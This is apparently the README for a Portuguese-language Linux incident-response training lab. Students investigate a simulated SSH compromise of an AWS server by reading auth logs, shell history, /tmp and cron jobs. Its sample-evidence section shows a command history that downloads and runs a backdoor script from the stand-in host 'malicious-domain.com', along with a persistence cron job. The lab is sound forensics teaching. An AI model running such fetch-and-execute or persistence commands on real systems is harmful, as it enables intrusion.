# 🔍 GLOBOMANTICS FORENSICS LAB

## Cenário

Um servidor da Globomantics foi **comprometido há aproximadamente 1 hora**. 

Sua missão é **investigar o servidor** e responder:
- Quando começou o ataque?
- Como o atacante entrou?
- O que ele fez?
- Quais arquivos foram modificados?
- O atacante ainda está lá?

---

## Como Funciona

### ✅ O que você FAZ:
- SSH para o servidor
- Lê logs e arquivos
- Investiga evidências
- Escreve um relatório

### ❌ O que você NÃO faz:
- Não executa scripts
- Não modifica nada
- Não apaga logs
- Não se conecta a processos

---

## Quick Start

### 1. Criar Infraestrutura
```bash
cd terraform
terraform init
terraform apply
```

### 2. Conectar ao Servidor
```bash
export SERVER_IP=$(terraform output -raw server_ip)
ssh -i terraform/keys/globomantics.pem ubuntu@$SERVER_IP
```

### 3. Investigar (Passo a Passo)

#### PASSO 1: Status Atual
```bash
who
date
uptime
```

#### PASSO 2: Investigar Logins
```bash
last -f /var/log/wtmp
sudo lastb -f /var/log/btmp
sudo cat /var/log/auth.log | tail -50
```

#### PASSO 3: Investigar Histórico
```bash
cat ~/.bash_history
sudo cat /root/.bash_history
```

#### PASSO 4: Arquivos Suspeitos
```bash
find / -mmin -60 2>/dev/null
ls -lart /tmp/
find /tmp -type f -newer /etc/hostname
```

#### PASSO 5: Processos Ativos
```bash
ps aux
netstat -tlnp 2>/dev/null
ss -tlnp 2>/dev/null
```

#### PASSO 6: Cron Jobs
```bash
sudo crontab -l
crontab -l
sudo cat /etc/crontab
ls -la /etc/cron.d/
```

### 4. Escrever Relatório

Crie um arquivo `INCIDENT_REPORT.md` respondendo:

1. **QUANDO começou?**
   - Hora exata do primeiro login suspeito

2. **COMO entrou?**
   - IP do atacante
   - Método (SSH brute force, vulnerabilidade, etc)

3. **O QUE fez?**
   - Lista de comandos em ordem
   - Arquivos criados/modificados

4. **QUAIS arquivos foram alterados?**
   - Caminhos dos arquivos
   - Hora de criação/modificação

5. **AINDA está lá?**
   - Processos ativos do atacante?
   - Backdoors instalados?

---

## O Que Você Vai Encontrar

### 📋 Logs de Ataque
Localização: `/var/log/auth.log`

Você verá:
- Tentativas de login falhadas
- Eventual login bem-sucedido
- Hora exata do acesso

### 📝 Histórico de Comandos
Localização: `/home/ubuntu/.bash_history` e `/root/.bash_history`

Você verá:
- Comandos que o atacante executou
- Ordem das ações
- Tentativas de escalação de privilégio

### 📂 Arquivos Suspeitos
Localização: `/tmp/` e `.hidden/`

Você verá:
- Scripts de backdoor
- Ferramentas de ataque
- Dados roubados

### ⏰ Cron Jobs
Localização: `/var/spool/cron/crontabs/`

Você verá:
- Jobs novos criados por atacante
- Mecanismos de persistência

---

## Estrutura do Projeto

```
forensics-lab/
├── terraform/
│   ├── main.tf           (Infraestrutura AWS)
│   ├── variables.tf      (Variáveis)
│   ├── user-data.sh      (Simula o ataque)
│   └── keys/             (SSH keys geradas)
├── README.md             (Este arquivo)
├── ENUNCIADO.md          (Instruções completas)
└── SOLUCAO.md            (Respuestas esperadas)
```

---

## Tempo Estimado

| Fase | Tempo |
|------|-------|
| Terraform setup | 5 min |
| SSH + exploração | 3 min |
| Investigação | 15-20 min |
| Escrita de relatório | 5-10 min |
| **Total** | **25-40 min** |

---

## Limpeza

```bash
cd terraform
terraform destroy
```

---

## Conceitos Aprendidos

✅ Análise de logs de segurança
✅ Investigação forense Linux
✅ Identificação de artefatos de ataque
✅ Timeline de incidentes
✅ Detecção de backdoors
✅ Documentação de forensics

---

## Exemplos de Evidências

### 1. Login Suspeito
```
Invalid user attacker from 203.45.67.89 port 54321
Failed password for ubuntu from 203.45.67.89 port 54323
Accepted password for ubuntu from 203.45.67.89 port 54330
```

### 2. Comandos Executados
```
wget https://malicious-domain.com/backdoor.sh
chmod +x backdoor.sh
./backdoor.sh
crontab -e
```

### 3. Arquivos Criados
```
/tmp/.hidden/monitor.sh
/tmp/update.py
/tmp/.dataexport
/tmp/sudo_abuse
```

### 4. Cron Job Suspeito
```
*/15 * * * * /tmp/.hidden/monitor.sh
```

---

## Dicas para Investigação

1. **Procure por mudanças de hora**: Arquivos com modificação próxima a 1 hora atrás
2. **Siga o IP**: O mesmo IP aparece em vários logs?
3. **Procure por "sudo"**: Escalação de privilégio é comum
4. **Verifique /tmp**: Atacantes costumam usar /tmp para files
5. **Procure por cron jobs**: Mecanismo comum de persistência
6. **Verifique usuários novos**: `cat /etc/passwd`

---

**Boa sorte na investigação! 🔍**

Lembre-se: Você é um Incident Response Engineer. Documente tudo.
